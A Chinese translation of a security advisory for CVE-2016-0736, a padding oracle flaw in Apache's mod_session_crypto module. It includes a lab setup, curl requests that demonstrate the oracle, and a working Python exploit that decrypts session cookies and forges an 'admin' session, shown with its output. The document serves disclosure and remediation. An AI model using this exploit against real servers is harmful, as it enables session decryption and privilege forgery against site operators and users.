> 原文链接: https://www.anquanke.com//post/id/85247 


# 【漏洞分析】Apache mod_session_crypto模块中的Padding Oracle漏洞分析（含PoC）


                                阅读量   
                                **96833**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：seclists.org
                                <br>原文地址：[http://seclists.org/fulldisclosure/2016/Dec/74](http://seclists.org/fulldisclosure/2016/Dec/74)

译文仅供参考，具体内容表达以及含义原文为准

****

**[![](https://p4.ssl.qhimg.com/t01d38df710d7f7bf7d.png)](https://p4.ssl.qhimg.com/t01d38df710d7f7bf7d.png)**

**<br>**

****

**翻译：**[**shan66******](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：120RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**前言**

近日，安全研究人员在Web服务器Apache的mod_session_crypto模块中发现了一个Padding Oracle漏洞。攻击者可以利用这个漏洞来解密会话数据，甚至可以用来对指定的数据进行加密。

<br>

**漏洞细节 **

**产品：**Apache HTTP Server mod_session_crypto

**受影响的版本：**2.3到2.5

**已经修复的版本：**2.4.25

**漏洞类型：**Padding Oracle

**安全风险：**高

**供应商网址：**[https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html](https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html)

**供应商状态：**已经发布修复版

**公告网址：**[https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt](https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt)

**公告状态：**已发布

**CVE：**CVE-2016-0736

**CVE网址：**[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736) 

<br>

**引言 **

人们可以联合使用Apache HTTP服务器的mod_session_crypto模块、mod_session模块和mod_session_cookie模块，将会话数据存储到用户浏览器中的加密Cookie中。这样可以避免使用服务器端会话状态，从而便于将传入的HTTP请求分配到多个不需要共享会话状态的应用程序Web服务器上面。

<br>

**更多细节 **

模块mod_session_crypto使用对称加密技术来加密和解密会话数据，并使用mod_session将加密后的数据存储到用户浏览器的Cookie（通常称为“会话”）中。之后，可以将解密的会话用于应用程序的环境变量或自定义的HTTP请求头部中。应用程序可以添加自定义的HTTP响应头部（通常是“X-Replace-Session”），通知HTTP服务器使用该头部的值替换该会话的内容。设置mod_session和mod_session_crypto的具体方法请参考下列文档： 

[https://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples](https://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples)

模块mod_session_crypto被配置为使用3DES或AES加密算法（密钥大小视具体情况而定），默认为AES256。具体的加密工作是由函数“encrypt_string”完成的： 

modules/session/mod_session_crypto.c



```
/**
 * Encrypt the string given as per the current config.
 *
 * Returns APR_SUCCESS if successful.
 */
static apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,
        session_crypto_dir_conf *dconf, const char *in, char **out)
`{`
[...]
    apr_crypto_key_t *key = NULL;
[...]
    const unsigned char *iv = NULL;
[...]
    /* use a uuid as a salt value, and prepend it to our result */
    apr_uuid_get(&amp;salt);
[...]
    res = apr_crypto_passphrase(&amp;key, &amp;ivSize, passphrase,
            strlen(passphrase),
            (unsigned char *) (&amp;salt), sizeof(apr_uuid_t),
            *cipher, APR_MODE_CBC, 1, 4096, f, r-&gt;pool);
[...]
    res = apr_crypto_block_encrypt_init(&amp;block, &amp;iv, key, &amp;blockSize, r-&gt;pool);
[...]
    res = apr_crypto_block_encrypt(&amp;encrypt, &amp;encryptlen, (unsigned char *)in,
            strlen(in), block);
[...]
    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &amp;tlen, block);
[...]
    /* prepend the salt and the iv to the result */
    combined = apr_palloc(r-&gt;pool, ivSize + encryptlen + sizeof(apr_uuid_t));
    memcpy(combined, &amp;salt, sizeof(apr_uuid_t));
    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);
    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);
    /* base64 encode the result */
    base64 = apr_palloc(r-&gt;pool, apr_base64_encode_len(ivSize + encryptlen +
                    sizeof(apr_uuid_t) + 1)
            * sizeof(char));
[...]
    return res;
`}`
```

源代码显示加密密钥是根据配置的密码和随机选择的salt通过调用函数“apr_crypto_passphrase”生成的。这个函数在内部使用PBKDF2来生成钥匙。然后，对数据进行加密，并将salt和IV放到加密后的数据前面。在返回之前，该函数会对加密数据进行base64编码处理。

由于这个过程无法保证密文的完整性，所以Apache模块无法检测会话送回服务器之前是否已经被篡改了。这常常意味着攻击者能够利用Padding Oracle漏洞发动攻击，即对会话进行解密并加密指定的任意数据。

<br>

**概念验证代码（POC）**

下面我们来复现这个安全漏洞。首先，启用模块mod_session、mod_session_crypto和mod_session_cookie，并进行如下所示的配置： 



```
Session On
SessionEnv On
SessionCookieName session path=/
SessionHeader X-Replace-Session
SessionCryptoPassphrase RedTeam
```

此外，为文件夹编写一个如下所示的CGI脚本，然后将该CGI脚本保存为“status.rb”，供客户端使用： 



```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
data = CGI.parse(ENV['HTTP_SESSION'])
if data.has_key? 'username'
        puts
        puts "your username is %s" % data['username']
        exit
end
puts "X-Replace-Session: username=guest&amp;timestamp=" + Time.now.strftime("%s")
puts
puts "not logged in"
```

搞定这个CGI脚本后，我们就可以在命令行HTTP客户端中通过curl来访问它了： 



```
$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb
HTTP/1.1 200 OK
Date: Tue, 19 Jan 2016 13:23:19 GMT
Server: Apache/2.4.10 (Ubuntu)
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Cache-Control: no-cache
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Transfer-Encoding: chunked
Content-Type: application/x-ruby
not logged in
```

该示例表明，返回了一个新的、名为“session”的加密cookie，并且响应正文中包含文本“not logged in”。

使用刚才返回的cookie再次调用上面的脚本，可以看到会话中的用户名为“guest”： 



```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= 
http://127.0.0.1:8080/cgi-bin/status.rb
your username is guest
```

现在修改这个cookie，让它以“u =”结尾，而非"U ="，然后发送修改后的cookie，由于尾部的填充物会导致该cookie失效，所以该会话就无法正确解密，也就无法传递给该CGI脚本了，所以，将再次返回文本“not logged in”： 



```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= 
http://127.0.0.1:8080/cgi-bin/status.rb
not logged in
```

这证明确实存在Padding Oracle漏洞。这样的话，我们就可以在Python库[1] python-paddingoracle的帮助下，通过利用这个Padding Oracle漏洞来解密会话。

exploit.py



```
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests
class PadBuster(PaddingOracle):
    def __init__(self, valid_cookie, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.wait = kwargs.get('wait', 2.0)
        self.valid_cookie = valid_cookie
    def oracle(self, data, **kwargs):
        v = b64encode(self.valid_cookie+data)
        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb&amp;apos;,
                cookies=dict(session=v), stream=False, timeout=5, verify=False)
        if 'username' in response.content:
            logging.debug('No padding exception raised on %r', v)
            return
        raise BadPaddingException
if __name__ == '__main__':
    import logging
    import sys
    if not sys.argv[2:]:
        print 'Usage: [encrypt|decrypt] &lt;session value&gt; &lt;plaintext&gt;'
        sys.exit(1)
    logging.basicConfig(level=logging.WARN)
    mode = sys.argv[1]
    session = b64decode(sys.argv[2])
    padbuster = PadBuster(session)
    if mode == "decrypt":
        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])
        print('Decrypted session:n%r' % cookie)
    elif mode == "encrypt":
        key = session[0:16]
        plaintext = sys.argv[3]
        s = padbuster.encrypt(plaintext, block_size=16)
        data = b64encode(key+s[0:len(s)-16])
        print('Encrypted session:n%s' % data)
    else:
        print "invalid mode"
        sys.exit(1)
```

然后，我们就可以通过此Python脚本来解密会话了： 



```
$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=
Decrypted session:
b'username=guest&amp;timestamp=1453282205rrrrrrrrrrrrr'
real    6m43.088s
user    0m15.464s
sys 0m0.976s
```

在这个示例应用程序中，会话数据包括用户名和时间戳。该Python脚本也可以用来对包含用户名"admin"的新会话进行加密： 



```
$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB
RU= username=admin
Encrypted session:
sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY
real3m38.002s
users0m8.536s
sys0m0.512s
```

如果将这个新加密的会话发送到服务器，这次显示用户名就会变成“admin”： 



```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7
zmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb
your username is admin
```



**解决方法 **

使用其他方式来存储会话，例如使用mod_session_dbd保存到数据库中。

<br>

**修复漏洞 **

更新到Apache HTTP版本2.4.25（参见[参考文献[2]](http://httpd.apache.org/security/vulnerabilities_24.html)）。

<br>

**安全风险**

使用mod_session_crypto模块的应用程序通常会把敏感的数据保存在在会话中，其安全性主要依赖于攻击者无法解密或修改该会话。如果存在Padding Oracle漏洞，那么攻击者能够利用它来破坏这种机制，并能够构造会话，放入攻击者指定的任意内容。根据应用程序本身的情况，有可能给它的安全性带来致命的打击。所以，这个一个高危漏洞。

<br>

**参考文献 **

[1] [https://github.com/mwielgoszewski/python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)

[2] [http://httpd.apache.org/security/vulnerabilities_24.html](http://httpd.apache.org/security/vulnerabilities_24.html)
